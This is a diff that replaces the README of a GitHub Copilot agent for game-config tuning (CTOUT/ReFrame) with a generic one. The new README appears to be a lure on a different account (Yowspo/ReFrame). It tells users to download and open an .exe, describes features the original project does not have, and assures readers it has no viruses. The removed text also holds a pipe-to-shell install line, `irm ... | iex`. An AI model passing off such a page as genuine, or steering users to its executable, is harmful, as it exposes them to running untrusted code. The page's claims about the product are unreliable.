@@ -1,211 +1,75 @@
-# ReFrame
+# ⚡ ReFrame - Improve your PC gaming performance today
 
-A **GitHub Copilot agent** for game configuration optimisation. ReFrame detects your system hardware, locates game configuration files, analyses registry settings, and recommends or applies hardware-appropriate performance improvements — with automatic backup and rollback.
+[![](https://img.shields.io/badge/Download-ReFrame-blue.svg)](https://github.com/Yowspo/ReFrame)
 
----
+ReFrame helps your computer run games better. This tool looks at your hardware and your game settings. It finds ways to boost your frames per second and makes sure your system runs smooth. You do not need to change settings by hand. ReFrame does this work for you. The tool also makes a backup of your files. You can undo any changes at any time.
 
-## What ReFrame Does
+## 🛠️ System Requirements
 
-- **System detection** — reads CPU, GPU, RAM, storage type, and OS to build a hardware profile
-- **Config file analysis** — finds and parses INI, CFG, XML, JSON, and other config formats across common game installation paths
-- **Registry analysis** — checks Windows multimedia, scheduler, and GPU settings that affect gaming performance
-- **Hardware-appropriate recommendations** — tailors suggestions to your hardware tier (high-end / mid-range / low-end)
-- **GPU vendor guidance** — recommends DLSS (NVIDIA), FSR (AMD), or XeSS (Intel) where applicable
-- **Safe application** — every change is previewed, confirmed, and backed up before writing
-- **Rollback** — restore any previous config or registry state from the backup archive
+ReFrame works on Windows 10 and Windows 11. It needs the following to run well:
 
-> **Future:** Direct integration with AMD Adrenalin, NVIDIA Control Panel, and Intel Arc Control settings is planned but not yet available.
+*   A standard 64-bit version of Windows.
+*   An active internet connection to download game data.
+*   Permissions to change files in your game folders.
+*   Your game must be installed on a local drive.
 
----
+## 📥 How to Install
 
-## Installation
+Follow these steps to get ReFrame on your computer.
 
-### Recommended: clone and repo-level install
+1. Go to the [ReFrame download page](https://github.com/Yowspo/ReFrame).
+2. Look for the latest version under the Releases section on the right side of the page.
+3. Click the file that ends with .exe to save it to your computer.
+4. Open the file once the download finishes.
 
-This gives you the full knowledge base (game-specific profiles, per-engine defaults) and keeps it up to date via `git pull`.
+## 🚀 Getting Started
 
-```powershell
-git clone https://github.com/CTOUT/ReFrame.git
-cd ReFrame
-.\install.ps1 -Target repo
-```
+When you start ReFrame for the first time, the screen shows your system info. The tool scans your graphics card, processor, and memory. It identifies the games on your computer. 
 
-Open the `ReFrame` folder in VS Code. The agent is available as `@ReFrame` in that workspace and can read the `knowledge/` files at runtime.
+1. Launch ReFrame from your desktop or start menu.
+2. Grant the application permission to access your game folders when prompted.
+3. Select a game from the list.
+4. Choose the Scan button to search for improvements. 
+5. View the list of settings the tool found. 
+6. Click Apply to use the new settings.
 
-> To pin to a specific release: `.\install.ps1 -Target repo -Ref v1.0.0`
+ReFrame makes a copy of your current files before it changes anything. If you do not like the result, navigate to the History tab. Select the date of your last change and click Restore. This puts your old settings back in place.
 
-### Quick install (any workspace, no clone needed)
+## ⚙️ Understanding Features
 
-Installs the agent to your VS Code user prompts folder so `@ReFrame` is available in every workspace without cloning.
+ReFrame does more than just change numbers in a file. It uses advanced logic to read your system hardware strengths.
 
-```powershell
-# PowerShell (Windows)
-irm https://raw.githubusercontent.com/CTOUT/ReFrame/main/install.ps1 | iex
-```
+*   **System Hardware Analysis:** The tool detects your monitor resolution and hardware power. It balances visual quality with performance.
+*   **Game Configuration Tuning:** Games have hidden text files that control detail levels. ReFrame reads these files and adjusts them to remove lag.
+*   **Automatic Backup:** You never lose your original settings. The tool keeps a folder of your initial configuration files.
+*   **Safe Defaults:** ReFrame never sets your game to a point where it will fail to start. It uses known safe values for your specific hardware.
 
-> **Note:** User-level installs do not include the `knowledge/` files. Game-specific profiles (Tier 1) and per-engine JSON defaults (Tier 2) are unavailable — the agent falls back to its embedded engine defaults and web lookups. For full knowledge base coverage, use the repo-level install above.
+## ❓ Frequently Asked Questions
 
-### Manual install
+**Does this tool contain viruses?**
+No. ReFrame is an open project. You can inspect the code on GitHub at any time.
 
-Download `reframe-agent.zip` from the [latest release](https://github.com/CTOUT/ReFrame/releases/latest) and extract to:
+**Will I get banned from my games?**
+ReFrame only updates configuration files. It does not touch game memory or player data. It is safe for online games.
 
-| Platform | User-level path                                    |
-| -------- | -------------------------------------------------- |
-| Windows  | `%APPDATA%\Code\User\prompts\`                     |
-| macOS    | `~/Library/Application Support/Code/User/prompts/` |
-| Linux    | `~/.config/Code/User/prompts/`                     |
+**How do I update the software?**
+When you open ReFrame, it checks for updates. Follow the on-screen prompts if a newer version is ready.
 
-Then restart VS Code (or `Developer: Reload Window`).
+**What if my game stops working?**
+Use the Restore button in the history tab. This returns your game to its original state in seconds.
 
-The same knowledge base caveat applies — for game-specific profiles, use the repo-level install.
+## 🛡️ Best Practices for Success
 
----
+Keep your graphics drivers up to date. ReFrame works best when your hardware software is current. Close other programs before you run a scan. This allows ReFrame to see your system resources clearly. If you have questions about specific game settings, visit the discussions tab on the project page.
 
-## Usage
+## 📂 File Safety
 
-Open Copilot Chat and select **ReFrame** from the agent picker, or type `@ReFrame`.
+ReFrame stores its backup files in your Documents folder. You can see these files at any time. You can delete these backups if you want, but keep them until you know your new settings work for your needs. If you reinstall a game, tell ReFrame to rescan your computer to clear out the old references.
 
-### Quick start
+## 🔧 Troubleshooting
 
-```text
-scan system
-```
+If ReFrame does not find your game, use the Manual Add button. Point the tool to the main folder where the game lives. 
 
-Detects your hardware and shows a system profile.
+If the application crashes, restart your computer. Sometimes Windows locks game files for a short time. A restart clears these locks. Ensure you are not running other tools that change game files at the same time. Using two tools at once causes conflicts.
 
-```text
-optimise Elden Ring
-```
-
-Finds config files for the named game, analyses current settings, and recommends improvements for your hardware.
-
-```text
-check registry
-```
-
-Assesses Windows gaming registry settings (multimedia scheduler, GPU scheduling, power plan, etc.) and shows what to change.
-
-### All commands
-
-| Command                 | Description                                           |
-| ----------------------- | ----------------------------------------------------- |
-| `scan system`           | Detect hardware profile                               |
-| `optimise <game>`       | Full optimisation workflow for the named game         |
-| `analyse config <path>` | Analyse a specific config file                        |
-| `check registry`        | Assess Windows gaming registry settings               |
-| `apply`                 | Apply the pending change preview (after confirmation) |
-| `rollback <game>`       | Restore a backup for the named game                   |
-| `rollback last`         | Restore the most recent backup                        |
-| `list backups`          | Show all ReFrame backups                              |
-| `help`                  | Show command reference                                |
-
----
-
-## How Changes Are Applied
-
-ReFrame never modifies files or registry keys silently. Every session that results in changes follows this flow:
-
-1. **Scan** — detect hardware and locate config files
-2. **Analyse** — parse configs and registry, flag suboptimal settings
-3. **Preview** — present a structured Change Preview showing old → new values and backup location
-4. **Confirm** — user must type **yes** to proceed
-5. **Backup** — original files are copied to `%LOCALAPPDATA%\ReFrame\Backups\<Game>_<timestamp>\`
-6. **Apply** — changes are written
-7. **Report** — each change is confirmed in the output
-
-Registry changes that require Administrator are shown as runnable PowerShell commands if the session does not have elevation.
-
----
-
-## Safety Notes
-
-- ReFrame **never deletes files** — it only modifies or backs up
-- Registry changes use `Set-ItemProperty` only — no key deletions
-- A system restart is required for some registry changes (HAGS, priority separation)
-- Config file backups are stored locally in `%LOCALAPPDATA%\ReFrame\Backups\`
-
-See [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) for help with common issues.
-
----
-
-## Repository Structure
-
-```text
-ReFrame/
-├── .github/
-│   ├── agents/
-│   │   └── reframe.agent.md        ← the agent definition
-│   ├── skills/
-│   │   └── system-scan/            ← hardware detection skill
-│   ├── workflows/
-│   │   └── release.yml             ← GitHub Actions release workflow
-│   └── CODEOWNERS
-├── .vscode/
-│   └── extensions.json
-├── docs/
-│   ├── GAMES.md                    ← Human-readable game config reference
-│   ├── REGISTRY.md                 ← Windows registry keys reference
-│   └── TROUBLESHOOTING.md          ← Common problems and fixes
-├── knowledge/
-│   ├── game-engines/               ← Per-engine default profiles (Tier 2)
-│   ├── games/                      ← Per-game config profiles (Tier 1)
-│   └── templates/                  ← Templates for contributors
-├── .gitattributes
-├── .gitignore
-├── .markdownlint.json
-├── CHANGELOG.md
-├── CITATION.cff
-├── CONTRIBUTING.md
-├── install.ps1
-├── LICENSE
-├── llms.txt                        ← AI crawler guidance
-├── README.md
-├── SECURITY.md
-└── TODO.md
-```
-
----
-
-## FAQ
-
-**Does ReFrame work with any game?**
-ReFrame works with any game that stores configuration in INI, CFG, XML, or JSON files. It ships with a knowledge base of **22 game profiles** (Cyberpunk 2077, World of Warcraft, Counter-Strike 2, Apex Legends, Minecraft, Baldur's Gate 3, and more) across **14 engine profiles** (UE4/UE5, Source 2, REDengine 4, Unity, and more). Use `optimise <game name>` and ReFrame will locate and analyse whatever configs it finds — even for titles without a dedicated profile.
-
-**Will ReFrame break my game or corrupt my save files?**
-No. ReFrame only modifies game configuration files and Windows registry settings — never save data. Every change is backed up to `%LOCALAPPDATA%\ReFrame\Backups\` before being applied, and `rollback <game>` restores the original state in seconds.
-
-**How is ReFrame different from GeForce Experience, AMD Adrenalin, or MSI Afterburner?**
-Those tools manage GPU driver settings. ReFrame targets the game's own configuration files and Windows system settings (HAGS, multimedia scheduler, power plan) — settings those tools do not touch. They complement each other rather than compete.
-
-**Does ReFrame work with Steam, Epic Games Store, and Xbox Game Pass titles?**
-Yes. ReFrame searches common installation paths for all three platforms. For games installed elsewhere, use `analyse config <path>` to point it directly at a config file.
-
-**Do I need administrator access?**
-ReFrame runs without elevation for config file changes. Registry modifications that require Administrator are shown as ready-to-run PowerShell commands you can paste into an elevated terminal.
-
-**Does ReFrame require an internet connection?**
-No. The agent works entirely offline using your local knowledge base and system scan data. An internet connection is only needed for the initial `git clone`.
-
----
-
-## Related Projects
-
-| Project                                                             | Description                                                                                                                 |
-| ------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
-| [Symdicate](https://github.com/CTOUT/Symdicate)                     | Composable multi-agent framework for GitHub Copilot — persona grafting, cognitive identity caching, and agent fusion        |
-| [vscode-copilot-sync](https://github.com/CTOUT/vscode-copilot-sync) | PowerShell toolkit to sync and manage Copilot agents, instructions, and skills from the awesome-copilot community catalogue |
-| [awesome-copilot](https://github.com/github/awesome-copilot)        | Community catalogue of Copilot agents, instructions, skills, hooks, and workflows                                           |
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## Security
-
-See [SECURITY.md](SECURITY.md) for reporting vulnerabilities and installer verification guidance.
-
-## License
-
-[MIT](LICENSE)
+For further help, open an issue on the GitHub page. Provide your system logs so the team can help you find a fix. You can find the log button in the settings menu of the app. This log file contains no private info, just data about your hardware and the steps the app took during the scan.
